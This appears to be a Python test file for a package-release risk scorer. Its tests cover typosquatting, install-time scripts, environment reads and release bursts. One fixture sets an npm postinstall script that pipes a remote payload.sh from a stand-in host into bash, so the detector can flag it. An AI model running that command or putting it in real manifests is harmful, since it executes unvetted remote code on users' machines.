from safecli_radar.models import ReleaseEvent
from safecli_radar.scorer import score_release


def test_scores_typo_near_popular_package():
    event = ReleaseEvent(
        ecosystem="npm",
        package_name="loadsh",
        version="1.0.0",
        source="test",
        cursor="1",
        seen_at="now",
    )

    score = score_release(event)

    assert score.risk_score >= 45
    assert score.impact_score >= 55
    assert any("lodash" in reason for reason in score.reasons)


def test_scores_npm_install_script_payload():
    event = ReleaseEvent(
        ecosystem="npm",
        package_name="normal-name",
        version="1.0.0",
        source="test",
        cursor="1",
        seen_at="now",
        metadata={
            "manifest": {
                "scripts": {
                    "postinstall": "curl https://example.invalid/payload.sh | bash",
                }
            }
        },
    )

    score = score_release(event)

    assert score.risk_score >= 60
    assert any("install-time script" in reason for reason in score.reasons)


def test_environment_read_alone_is_low_risk_artifact_signal():
    event = ReleaseEvent(
        ecosystem="npm",
        package_name="normal-name",
        version="1.0.0",
        source="test",
        cursor="1",
        seen_at="now",
        metadata={
            "artifact_triage": {
                "findings": ["reads environment variables in package/index.js"],
            }
        },
    )

    score = score_release(event)

    assert score.risk_score == 5


def test_release_burst_adds_history_risk():
    event = ReleaseEvent(
        ecosystem="npm",
        package_name="normal-name",
        version="1.0.0",
        source="test",
        cursor="1",
        seen_at="now",
        metadata={
            "history": {
                "radar_prior_release_count": 4,
                "radar_recent_release_count_1h": 5,
            }
        },
    )

    score = score_release(event)

    assert score.risk_score >= 20
    assert any("release burst" in reason for reason in score.reasons)
